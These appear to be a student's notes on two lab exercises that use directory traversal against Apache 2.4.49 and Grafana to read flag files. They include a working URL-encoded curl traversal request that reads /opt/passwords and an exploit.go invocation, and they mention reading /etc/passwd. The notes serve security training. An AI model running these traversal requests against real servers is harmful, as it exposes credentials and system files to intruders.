
1. In this section, we used URL encoding to exploit the directory traversal vulnerability in Apache 2.4.49 on VM #1. Use _Burp_ or **curl** to display the contents of the **/opt/passwords** file via directory traversal in the vulnerable Apache web server. Remember to use URL encoding for the directory traversal attack. Find the flag in the output of the file.

```bash
curl http://192.168.174.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
```
![[Pasted image 20250311221111.png]]

2. Grafana is running on port 3000 on VM #2. The version running is vulnerable to the same directory traversal vulnerability as in the previous section. While URL encoding is not needed to perform a successful directory traversal attack, experiment with URL encoding different characters of your request to display the contents of **/etc/passwd**. Once you have a working request utilizing URL encoding, obtain the flag by displaying the contents of **/opt/install.txt**.

```bash
# Directory Traversal for Grafana
go run exploit.go -target http://192.168.174.16:3000 -file /opt/install.txt
```
![[Pasted image 20250311221300.png]]
